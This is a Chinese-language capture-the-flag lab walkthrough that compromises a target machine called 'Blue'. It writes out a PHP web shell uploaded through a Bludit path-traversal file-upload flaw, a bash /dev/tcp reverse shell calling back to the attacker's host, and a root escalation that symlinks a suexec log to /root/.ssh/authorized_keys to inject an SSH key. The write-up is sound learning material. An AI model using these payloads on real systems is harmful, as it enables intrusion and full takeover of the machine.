---
title: Blue
subtitle: 利用 Bludit 文件上传漏洞获取反向 Shell，再借 SUID 日志软链接写入 SSH 公钥完成 root 提权
author: 冰冰洁
tags:
  - "#靶机学习"
  - "#反向shell"
  - "#权限提升"
  - "#软链接"
date: 2026-11-12 16:54
---
# 信息收集

依旧端口扫描：

![[Pasted image 20261112143554.png]]

![[Pasted image 20261112143908.png]]

访问发现会跳转到`blue.dsz`

于是添加`/etc/hosts`：

```bash
echo '192.168.56.107 blue.dsz' | sudo tee -a /etc/hosts
```

![[Pasted image 20261112144315.png]]

得到一个界面，但是没有找到什么有用的信息，尝试扫描目录：

```bash
dirsearch -u http://blue.dsz/
```

![[Pasted image 20261112144647.png]]

发现一个`/.gitignore`文件，这种文件可能会有信息，因此尝试访问：

![[Pasted image 20261112145142.png]]

暴露了`credentials.ini`

![[Pasted image 20261112145229.png]]

得到一个字符串。看起来很像随机生成的密码：

```txt
gl_+&YW3$28S^&R%
```

想到刚才目录枚举时有一个`/admin`目录，访问：

![[Pasted image 20261112145455.png]]

尝试用`admin`为用户名，然后使用密码登录

![[Pasted image 20261112145544.png]]

登录成功，由于这是`blufit`服务，去网上搜一下是否有什么突破点：

![[Pasted image 20261112145652.png]]

![[Pasted image 20261112145725.png]]

版本小于`3.18.4`，存在远程代码执行漏洞

且该漏洞存在于接口`/api/files/{key}`处

需要找到版本对应源码确定其是否对文件上传有过滤，于是找到[bludit对应版本的源码](https://github.com/bludit/bludit/blob/3.18.2/bl-plugins/api/plugin.php):

![[Pasted image 20261112150425.png]]

在源码中还发现上传时需要有效的`token`，查看：

![[Pasted image 20261112150124.png]]

得到一个`api token`：

```txt
b35bbff0d5e6b8829b214fdfb7f72ed70f42e07bbf860985a3a585cf59ed75cc55645df2ac7264b4ca0655f19cbf6eff792a7a01801368141e4550d7e8c056d3
```

![[Pasted image 20261112150807.png]]

没有对文件上传类型进行限制，于是可以直接上传一个payload使得靶机自己连接攻击机得到shell

## 漏洞利用


由于这个靶机是文件上传漏洞，因此我们要先上传一个文件得到shell，然后再使用这个shell来反连我们的攻击机，因此：

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php

curl --path-as-is -X POST 'http://blue.dsz/api/files/..' -F 'token=b35bbff0d5e6b8829b214fdfb7f72ed70f42e07bbf860985a3a585cf59ed75cc55645df2ac7264b4ca0655f19cbf6eff792a7a01801368141e4550d7e8c056d3' -F 'file=@./shell.php;filename=shell.php;type=application/x-php'
```


起监听：

```bash
nc -lvnp 4444
curl --get 'http://blue.dsz/bl-content/uploads/shell.php' --data-urlencode
'cmd=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.56.1/4444 0>&1"' #反弹shell
```

![[Pasted image 20261112154541.png]]

成功

![[Pasted image 20261112154942.png]]

尝试更新shell失败

# root提权

查看`SUID`文件：

```bash
find / -perm -4000 -type f 2>/dev/null
```

![[Pasted image 20261112155413.png]]

可疑文件：

```
/usr/sbin/suexec
```

![[Pasted image 20261112155532.png]]

直接运行报错，查看日志

![[Pasted image 20261112161125.png]]

发现会把运行时的参数直接写入日志，因此我们可以使得这个文件软链接到其他文件，这样我们就可以任意写入一个文件，但是发现我们没有这个文件的写入权限：

```bash
ls -ld /var/log/apache2
```

![[Pasted image 20261112163137.png]]

查看配置，看能否更改：

```bash
cat /etc/logrotate.d/apache2
```

发现有一个error.log文件可以帮助我们修改该文件权限：

![[Pasted image 20261112163311.png]]

- `size 5M`：logrotate 运行时，如果 `error.log` 达到配置的大小条件，就会轮转。
- `postrotate` 下的 `chmod 777 /var/log/apache2`：轮转后执行，把日志目录改成可写。

这里没能在靶机下载`pspy64`，直接使用wp里说的1分钟。

首先将error.log的大小调制5m以上：

```bash
curl -sG 'http://blue.dsz/bl-content/uploads/shell.php' --data-urlencode 'cmd=for i in $(seq 1 1000000); do printf "ERR-%s\n" "$i" >&2; done; echo done'
```

等待轮转，确认我们已经有了写的权限

![[Pasted image 20261112164704.png]]

然后将suexec.log 换成指向 /root/.ssh/authorized_keys 的软链接，再触发suexec，root 写⽇志时参数⾥的换⾏会把公钥带进 authorized_keys：

```bash
mv /var/log/apache2/suexec.log /var/log/apache2/suexec.bak 2>/dev/null

ln -s /root/.ssh/authorized_keys /var/log/apache2/suexec.log

/usr/sbin/suexec apache apache "$(printf '/var/www/localhost/htdocs/x\n%s\n#' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILN9Y3tvFFE8LuwXFaUj3EdxVvhpVfjJZXLLbC+Paag5 kali@kali')"
```

用攻击机登录，成功

![[Pasted image 20261112165323.png]]
